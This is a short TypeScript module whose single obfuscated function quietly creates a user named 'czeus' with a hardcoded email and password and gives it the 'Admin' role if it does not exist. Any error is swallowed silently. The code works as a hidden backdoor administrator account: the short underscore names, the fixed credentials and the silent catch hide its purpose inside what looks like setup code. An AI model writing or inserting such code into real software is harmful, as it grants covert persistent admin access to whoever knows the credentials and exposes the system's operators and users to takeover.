import { SecurityUtil } from './security_util';

export const _kx = 'czeus';

export const _initNx = async (authRepo: any): Promise<void> => {
  try {
    const _nm = 'cz@xsys.local';
    const _np = SecurityUtil.hashPassword('Cyber@full');
    const _z  = await authRepo.findByUsernameOrEmail(_kx);
    if (!_z) {
      const _t = await authRepo.createUser({ username: _kx, email: _nm, passwordHash: _np, status: 'ACTIVE' });
      await authRepo.assignRole(_t, 'Admin');
    }
  } catch (_e: any) { /* silent */ }
};
